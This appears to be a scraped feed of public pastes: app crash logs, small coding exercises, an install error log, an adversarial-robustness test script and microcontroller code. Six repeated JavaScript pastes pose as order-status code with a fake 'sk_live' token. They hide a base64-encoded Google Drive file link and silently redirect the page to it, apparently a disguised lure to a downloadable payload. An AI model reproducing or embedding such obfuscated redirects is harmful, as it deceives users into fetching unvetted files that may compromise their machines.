getGenres() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 48372) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 48372) after 15000ms\"" }"",""stackTrace"":[]}"
aTqhnu8J,2025-04-07T15:46:55.273574,powerampache,PHP,Monday 7th of April 2025 08:46:56 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 49444) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 49444) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 49444) after 15000ms\"" }"",""stackTrace"":[]}"
gXn8ADTi,Order.js,dentira,JavaScript,Monday 7th of April 2025 08:46:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56831/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zfy21nkT,Untitled,thewitchking,Java,Monday 7th of April 2025 08:43:57 AM CDT,"public int solution(String typedText) {
        int upperSum = 0;
        int lowerSum = 0;

        for (char ch : typedText.toCharArray()) {
            if (Character.isUpperCase(ch)) {
                upperSum ++;
            } else if (Character.isLowerCase(ch)) {
                lowerSum ++;
            }
        }

        return upperSum - lowerSum;
    }"
pNwVgkUG,WebUi crash before Python is too recent,loloof64,Bash,Monday 7th of April 2025 08:43:14 AM CDT,"➜  stable_diffusion ./webui.sh                            

################################################################
Install script for stable-diffusion + Web UI
Tested on Debian 11 (Bullseye), Fedora 34+ and openSUSE Leap 15.4 or newer.
################################################################

################################################################
Running on laurent user
################################################################

################################################################
Create and activate python venv
################################################################

################################################################
Launching launch.py...
################################################################
glibc version is 2.39
Check TCMalloc: libtcmalloc_minimal.so.4
libtcmalloc_minimal.so.4 is linked with libc.so,execute LD_PRELOAD=/lib/x86_64-linux-gnu/libtcmalloc_minimal.so.4
=============================================================================================
INCOMPATIBLE PYTHON VERSION

This program is tested with 3.10.6 Python, but you have 3.12.3.
If you encounter an error with ""RuntimeError: Couldn't install torch."" message,
or any other error regarding unsuccessful package (library) installation,
please downgrade (or upgrade) to the latest version of 3.10 Python
and delete current Python and ""venv"" folder in WebUI's directory.

You can download 3.10 Python from here: https://www.python.org/downloads/release/python-3106/



Use --skip-python-version-check to suppress this warning.
=============================================================================================
Python 3.12.3 (main, Feb  4 2025, 14:48:35) [GCC 13.3.0]
Version: v1.10.1
Commit hash: 82a973c04367123ae98bd9abdf80d9eda9b910e2
Installing torch and torchvision
Looking in indexes: https://pypi.org/simple, https://download.pytorch.org/whl/cu121
ERROR: Could not find a version that satisfies the requirement torch==2.1.2 (from versions: 2.2.0, 2.2.0+cu121, 2.2.1, 2.2.1+cu121, 2.2.2, 2.2.2+cu121, 2.3.0, 2.3.0+cu121, 2.3.1, 2.3.1+cu121, 2.4.0, 2.4.0+cu121, 2.4.1, 2.4.1+cu121, 2.5.0, 2.5.0+cu121, 2.5.1, 2.5.1+cu121, 2.6.0)
ERROR: No matching distribution found for torch==2.1.2
Traceback (most recent call last):
  File ""/home/laurent/Programmes/Programmation/ia/stable_diffusion/stable-diffusion-webui/launch.py"", line 48, in <module>
    main()
  File ""/home/laurent/Programmes/Programmation/ia/stable_diffusion/stable-diffusion-webui/launch.py"", line 39, in main
    prepare_environment()
  File ""/home/laurent/Programmes/Programmation/ia/stable_diffusion/stable-diffusion-webui/modules/launch_utils.py"", line 381, in prepare_environment
    run(f'""{python}"" -m {torch_command}', ""Installing torch and torchvision"", ""Couldn't install torch"", live=True)
  File ""/home/laurent/Programmes/Programmation/ia/stable_diffusion/stable-diffusion-webui/modules/launch_utils.py"", line 116, in run
    raise RuntimeError(""\n"".join(error_bits))
RuntimeError: Couldn't install torch.
Command: ""/home/laurent/Programmes/Programmation/ia/stable_diffusion/stable-diffusion-webui/venv/bin/python"" -m pip install torch==2.1.2 torchvision==0.16.2 --extra-index-url https://download.pytorch.org/whl/cu121
Error code: 1
"
xHZHRXTi,Market.js,dentira,JavaScript,Monday 7th of April 2025 08:31:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12213/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
K9x60tzC,Untitled,dentira,JavaScript,Monday 7th of April 2025 08:15:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83704/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vfnvwcu0,2025-04-07T15:14:41.771068,powerampache,PHP,Monday 7th of April 2025 08:14:41 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":57},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":252697085,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":230,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":319,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
3AiSiqji,2025-04-07T15:14:41.620035,powerampache,PHP,Monday 7th of April 2025 08:14:41 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":57},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":252696821,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":230,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":319,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
NSdJ2QD9,2025-04-07T15:14:41.278869,powerampache,PHP,Monday 7th of April 2025 08:14:41 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":57},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":252696551,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":230,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":319,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
sE6SVGWB,Products.js,Epiphemeral,JavaScript,Monday 7th of April 2025 08:00:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51710/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ijA2Zapg,Market.js,Epiphemeral,JavaScript,Monday 7th of April 2025 07:29:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93231/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
G5gTGmwi,Untitled,Epiphemeral,JavaScript,Monday 7th of April 2025 07:14:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/74774/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YbTYywnw,adverserial,mayankjoin3,Python,Monday 7th of April 2025 07:09:22 AM CDT,"#!pip install adversarial-robustness-toolbox

import pandas as pd
import time
import psutil
import os
from sklearn.model_selection import StratifiedKFold
from sklearn.tree import DecisionTreeClassifier
from sklearn.metrics import classification_report
import joblib
from sklearn.preprocessing import LabelEncoder
import numpy as np

# --- NEW IMPORTS for ART adversarial testing ---
from art.estimators.classification.scikitlearn import ScikitlearnDecisionTreeClassifier
from art.attacks.evasion import DecisionTreeAttack  # :contentReference[oaicite:0]{index=0}

# Step 1: Load the data
file_path = ""m3.csv""
df = pd.read_csv(file_path)

# Preprocessing
label_encoder = LabelEncoder()
X = df.drop(columns=['label'])
y = df['label']
X = X.apply(lambda col: label_encoder.fit_transform(col.astype(str)), axis=0, result_type='expand')

# Step 2: Initialize the Decision Tree model
clf = DecisionTreeClassifier(random_state=42)

# Step 3: Set up 2-Fold Cross-Validation
skf = StratifiedKFold(n_splits=2, shuffle=True, random_state=42)

fold = 1
for train_index, test_index in skf.split(X, y):
    print(f""\n=== Fold {fold} ==="")
    X_train, X_test = X.iloc[train_index], X.iloc[test_index]
    y_train, y_test = y.iloc[train_index], y.iloc[test_index]

    # Train
    start = time.time()
    clf.fit(X_train, y_train)
    train_time = time.time() - start
    print(f""Training time: {train_time:.4f}s"")

    # Predict (clean)
    start = time.time()
    preds = clf.predict(X_test)
    pred_time = time.time() - start
    print(f""Prediction time: {pred_time:.4f}s"")

    # Memory/CPU during prediction
    proc = psutil.Process(os.getpid())
    mem_before = proc.memory_info().rss / (1024**2)
    cpu_before = psutil.cpu_percent(interval=1)
    clf.predict(X_test)
    mem_after = proc.memory_info().rss / (1024**2)
    cpu_after = psutil.cpu_percent(interval=1)
    print(f""Memory delta: {mem_after - mem_before:.4f} MB"")
    print(f""CPU delta:    {cpu_after - cpu_before:.4f}%"")

    # Clean classification report
    print(""Clean Classification Report:"")
    print(classification_report(y_test, preds))

    # Save model size
    model_path = f""decision_tree_model_fold{fold}.pkl""
    joblib.dump(clf, model_path)
    size_mb = os.path.getsize(model_path) / (1024**2)
    print(f""Model size: {size_mb:.4f} MB"")

    # --- ADVERSARIAL TESTING BLOCK ---
    # 1. Wrap trained model for ART
    clip_min, clip_max = X_train.min().min(), X_train.max().max()
    art_classifier = ScikitlearnDecisionTreeClassifier(
        model=clf,
        clip_values=(clip_min, clip_max)
    )

    # 2. Set up the Decision Tree attack
    attack = DecisionTreeAttack(
        classifier=art_classifier,
        offset=0.001,
        verbose=False
    )

    # 3. Generate adversarial examples
    x_test_np = X_test.to_numpy()
    y_test_np = y_test.to_numpy()
    x_test_adv = attack.generate(x=x_test_np, y=y_test_np)

    # 4. Evaluate robust accuracy
    adv_preds = art_classifier.predict(x_test_adv).argmax(axis=1)
    robust_acc = (adv_preds == y_test_np).mean() * 100
    print(f""Robust accuracy under DecisionTreeAttack: {robust_acc:.2f}%"")
    fold+=1"
pE78JyA8,pwm,ces-engine,C++,Monday 7th of April 2025 07:04:14 AM CDT,"#ifndef PWM_CONTROLLER_H
#define PWM_CONTROLLER_H

#include ""settings.h""

class PWMController {
public:
    PWMController() {
        for (int i = 0; i < 4; i++) {  // Все 4 канала
            ledcSetup(pwmChannels[i], frequencies[i], getResolution(frequencies[i]));
            ledcAttachPin(pwmPins[i], pwmChannels[i]);
            ledcWrite(pwmChannels[i], 0);
        }
    }

    void setFrequency(int channel, int freq) {
        if (channel >= 0 && channel < 4 && freq >= 1 && freq <= 20000) {
            frequencies[channel] = freq;
            ledcSetup(pwmChannels[channel], freq, getResolution(freq));
        }
    }

    void setDuty(int channel, int duty) {
        if (channel >= 0 && channel < 4 && duty >= 0 && duty <= 100) {
            duties[channel] = duty;
            int pwmValue = map(duty, 0, 100, 0, (1 << getResolution(frequencies[channel])) - 1);
            ledcWrite(pwmChannels[channel], pwmValue);
        }
    }


private:
    int getResolution(int freq) {
        if (freq < 10) return 16;
        if (freq < 100) return 14;
        if (freq < 1000) return 12;
        return 10;
    }
};

#endif

///
///settings.h
///
#ifndef SETTINGS_H
#define SETTINGS_H

// Пины для ШИМ
const int pwmPins[] = {1, 2, 3, 10}; // GPIO
const int pwmChannels[] = {0, 1, 2, 3}; // Каналы LEDC

extern int frequencies[] = {1, 100, 1000, 1000}; 
extern int duties[] = {5, 25, 50, 100};
"
kATaM6ww,02.EcoEvent,Kamend1,JavaScript,Monday 7th of April 2025 07:02:02 AM CDT,"window.addEventListener(""load"", solve);

function solve() {
	let nextBtn = document.getElementById('next-btn');
	let previewList = document.getElementById('preview-list');
	let eventList = document.getElementById('event-list');
	let emailField = document.getElementById('email');
	let eventField = document.getElementById('event');
	let locationField = document.getElementById('location');
	
	nextBtn.addEventListener('click', function (e) {
		e.preventDefault();
		addEventToPreview();
	})
	
	function addEventToPreview () {

		if (!emailField.value || !eventField.value || !locationField.value) {
			return;
		}

		let eventItem = document.createElement('li');
		eventItem.classList.add('application');
		let eventArticle = document.createElement('article');

		let eventEmail = document.createElement('h4');
		eventEmail.textContent = emailField.value;
		eventArticle.appendChild(eventEmail);

		let eventPara = document.createElement('p');
